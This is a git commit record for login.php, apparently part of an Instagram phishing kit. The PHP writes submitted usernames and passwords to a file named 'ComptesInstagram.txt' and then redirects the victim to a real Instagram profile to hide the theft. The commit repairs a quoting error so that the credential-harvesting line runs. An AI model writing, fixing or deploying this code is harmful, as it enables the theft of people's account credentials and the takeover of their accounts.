6cff2337b470445942c0d667189364d242190c77
TheLinuxProject <64985848+thelinuxproject@users.noreply.github.com>
2020-06-15 01:26:29 +0200

    Update login.php

--- login.php
+++ login.php
@@ -1,5 +1,5 @@
 <?php
- file_put_contents("ComptesInstagram.txt","  Compte : " . $_POST['username'] . \n"  Mot de Pass : " .$_POST['password'] . "\n\n",FILE_APPEND);
+ file_put_contents("ComptesInstagram.txt","  Compte : " . $_POST['username'] . "\n  Mot de Pass : " .$_POST['password'] . "\n\n",FILE_APPEND);
  header('Location: https://www.instagram.com/thelinuxproject/?hl=fr');
  exit();
 
